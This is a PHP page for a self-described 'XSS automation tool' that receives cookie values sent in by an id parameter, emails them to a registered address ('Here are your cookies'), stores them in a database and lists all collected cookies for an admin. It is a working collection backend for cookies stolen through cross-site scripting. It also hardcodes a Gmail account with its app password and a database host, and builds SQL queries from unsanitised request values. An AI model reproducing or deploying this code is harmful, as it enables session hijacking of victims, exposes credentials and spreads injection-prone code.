<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

session_start();
//echo "id:".$_SESSION['userID'];
if ($_SESSION['userID']!='admin') {
   header("Location: login.php"); // 로그인되지 않은 경우 login.php로 리다이렉트
   exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <!-- Basic -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <!-- Mobile Metas -->
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <!-- Site Metas -->
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <title>XSS tool server</title>

    <!-- slider stylesheet -->
    <link rel="stylesheet" type="text/css"
        href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css" />

    <!-- bootstrap core css -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />

    <!-- fonts style -->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,700&display=swap"
        rel="stylesheet">
    <!-- Custom styles for this template -->
    <link href="css/style.css" rel="stylesheet" />
    <link href="send.css" rel="stylesheet" />
    <!-- responsive style -->
    <link href="css/responsive.css" rel="stylesheet" />
</head>

<body class="sub_page">
    <div class="hero_area">
        <!-- header section strats -->
        <header class="header_section" style="background-color: black">
            <div class="container-fluid">
                <nav class="navbar navbar-expand-lg custom_nav-container pt-3">
                    <a class="navbar-brand" href="index.php">
                        <span>
                            Seven Group
                        </span>
                    </a>
                    <button class="navbar-toggler" type="button" data-toggle="collapse"
                        data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
                        aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon"></span>
                    </button>

                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
                        <div class="d-flex ml-auto flex-column flex-lg-row align-items-center">
                            <ul class="navbar-nav  ">
                                <li class="nav-item active">
                                    <a class="nav-link" href="index.php">Home <span class="sr-only">(current)</span></a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="admin.php"> admin </a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="setting.php"> setting </a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="send.php"> send </a>
                                </li>
                            </ul>
                            <div class="user_option">
                                <a href="logout.php" class="nav-link" style="color: white">
                                    logout  
                                </a>
                                <form class="form-inline my-2 my-lg-0 ml-0 ml-lg-4 mb-3 mb-lg-0">
                                    <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>
                                </form>
                            </div>
                        </div>
                    </div>
                </nav>
            </div>
        </header>
    </div>
</body>

</html>


<?php

require 'plugin/Exception.php';
require 'plugin/PHPMailer.php';
require 'plugin/SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$db_host = "3.39.23.243";
$db_user = "  ";
$db_password = "  ";
$db_name_getsend = "getsend";
$db_name_getin = "getin";

// 연결 생성
$conn_getsend = mysqli_connect($db_host, $db_user, $db_password, $db_name_getsend);
$conn_getin = mysqli_connect($db_host, $db_user, $db_password, $db_name_getin);

if (mysqli_connect_errno()) {
    die("Database connection failed: " . mysqli_connect_error());
}

$getid = isset($_REQUEST['id'])? $_REQUEST['id'] : '';
$cookie = isset($_REQUEST["cookie"])?$_REQUEST["cookie"]:'';
$query = "SELECT getemail FROM users WHERE getid='".$getid."' ORDER BY id DESC LIMIT 1";
$result = mysqli_query($conn_getin, $query);
$row = $result->fetch_array();

if($row && $getid){
    // 메일을 전송해야할때
    //전송해야할 메일주소
    $toEmail = $row['getemail'];

    // PHPMailer를 사용한 이메일 전송
    $mail = new PHPMailer(true);
    
    $mail->CharSet = PHPMailer::CHARSET_UTF8;
    $mail->Encoding = "base64";
    $mail->SMTPAuth = true;
    $mail->SMTPSecure = 'ssl';
    $mail->Host = 'smtp.gmail.com';
    $mail->Port = 465;
    $mail->Mailer = 'smtp';
    $mail->Username = 'yunh8949@gmail.com';
    $mail->Password = 'chso voks ycnc udog';
    $mail->AddAddress($toEmail, 'Receiver');
    $mail->SetFrom('yunh8949@gmail.com', 'Sender');
    $mail->isHTML(true);
    $mail->Subject = 'Your Cookies';
    $mail->Body = 'Here are your cookies: ' . $cookie;
    
    //echo var_dump($mail);
    //exit;
   
    //echo '이메일 성공 여부';
    if (!$mail->send()) {
        echo 'Mailer Error: ' . $mail->ErrorInfo;
    } else {
        echo "<div style='text-align: center;'>";
        echo "<br>";
        echo "<div style=''><h1 style='font-weight: bold;'>데이터 조회 </h1>";
        echo '이메일 성공 여부<br>';
        echo 'Email sent successfully';
    }
    //쿠키저장
    $insertquery = "insert into cookies(user_id,cookie_value) values('$getid','$cookie');";
    //echo $insertquery;
    //echo $toEmail;
    mysqli_query($conn_getsend,$insertquery);
    echo "<script>alert('메일 전송 완료')</script>";
}else{
    //에러 - 동일아이디를 찾을수 없을때
    //echo "<script>alert('아이디를 찾을수 없음')</script>";
    echo "<div style='text-align: center;'>";
    echo "<br>";
    echo "<div style=''><h1 style='font-weight: bold;'>데이터 조회 </h1>";
    echo "<br>";
    echo "아이디를 찾을 수 없음";
}

$items_per_page = 10;
$current_page = isset($_GET['page']) ? $_GET['page'] : 1;
$start_from = ($current_page - 1) * $items_per_page;
$result = mysqli_query($conn_getsend, "SELECT user_id,cookie_value FROM cookies LIMIT $start_from, $items_per_page");
?>

<!DOCTYPE html>
<html lang="ko">
    <style>
    /* 전체 옵션 */
    a {
        text-decoration: none;
        color: #dddd;
    }

    ul li {
        list-style: none;
    }

    /* 게시판 목록 */
    a {
        text-decoration: none;
        color: #dddd;
    }

    ul li {
        list-style: none;
    }

    #board_area {
        width: 30%; 
        margin: 0 auto;
    }

    .list-table {
        margin-top: 10px;
        width: 500px;
        height: 30px;
        border-collapse: collapse;
        margin-left: -35px;
    }

    .list-table thead th {
        height: 30px; 
        border-top: 5px solid #000;
        border-bottom: 1px solid #CCC;
        font-weight: bold;
        font-size: 14px; 
        text-align: center;
    }

    .list-table tbody td {
        padding: 8px 0; 
        border-bottom: 1px solid #CCC;
        height: 30px;
        font-size: 12px;
        text-align: center;
    }

    .list-table tbody tr:nth-child(even) {
        background-color: #efefef;
    }

    #write_btn {
        position: absolute;
        margin-top: 20px;
        right: 20px;
    }
        
    .pagination {
        display: inline-block;
        margin-top: 20px;
    }

    .pagination a {
        color: black;
        float: left;
        padding: 5px 9px;
        text-decoration: none;
        transition: background-color .3s;
        border: 1px solid #ddd;
        margin: 0 4px;
    }

    .pagination a.active {
        background-color: #dddddd;
        color: white;
        border: 1px solid #dddddd;
    }

    .pagination a:hover:not(.active) {
        background-color: #ddd;
    }


    </style>
<head>
    <meta charset="UTF-8">
    <title>xss 자동화 도구</title>
</head>

<body>

    <!--  데이터 조회 -->
    <?php
//오름차순
//$result = mysqli_query($conn_getsend, "SELECT id, user_id, cookie_value FROM cookies LIMIT $start_from, $items_per_page");
//내림차순
$result = mysqli_query($conn_getsend, "SELECT id, user_id, cookie_value FROM cookies ORDER BY id DESC LIMIT $start_from, $items_per_page");

if ($result) {
    echo "<div id='board_area'>";
    echo "<div style='text-align: center;'>";
    echo "<br>";
    echo "<table class='list-table' border='1'>";
    echo "<thead><tr><th>ID</th><th>id</th><th>cookie</th></tr></thead><tbody>";
    while ($row = mysqli_fetch_assoc($result)) {
        $id = isset($row['id']) ? $row['id'] : '';
        echo "<tr><td>{$id}</td><td>{$row['user_id']}</td><td>{$row['cookie_value']}</td></tr>";
    }
    echo "</tbody></table>";

    $result_count = mysqli_query($conn_getsend, "SELECT COUNT(*) AS total FROM cookies");
    $row_count = mysqli_fetch_assoc($result_count);
    $total_pages = ceil($row_count['total'] / $items_per_page);

    echo "<div class='pagination'>";
    echo "<a href='?page=" . ($current_page - 1) . "'>&lt;&nbsp;</a> ";
    for ($i = 1; $i <= $total_pages; $i++) {
        $active_class = ($i == $current_page) ? 'class="active"' : '';
        echo "<a href='?page=$i' $active_class>$i</a> ";
    }
    echo "<a href='?page=" . ($current_page + 1) . "'>&nbsp;&gt;</a>";
    echo "</div></div></div>";

    mysqli_free_result($result);
}

mysqli_close($conn_getsend);
?>


</body>

</html>
